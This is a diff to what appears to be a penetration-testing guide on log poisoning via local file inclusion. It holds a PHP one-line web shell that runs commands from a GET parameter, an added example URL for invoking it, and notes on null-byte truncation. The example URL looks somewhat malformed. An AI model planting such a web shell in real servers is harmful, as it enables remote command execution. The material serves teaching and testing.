@@ -77,6 +77,12 @@ Log Injection / Log Poisoning is a technique used to obtain a reverse shell from
 <?php system($_GET['c']); ?>
 ```
 
+After injecting the payload, we can access it via the following URL:
+
+```bash
+https://$url/var/log/httpd&c=whoami
+```
+
 ### Additional Notes
 
 * Sometimes during Local File Inclusion, the web server may append something like `.php` or `.config` to the file. For example, including `/etc/passwd` may be rendered as `/etc/passwd.php`. This occurs when the include function uses a parameter like `?page` and concatenates the .php extension to the file. In versions of PHP below 5.3, ending the URL with a null byte (`%00`) will cause the interpreter to stop reading, this would then allow you to include and view the intended page.
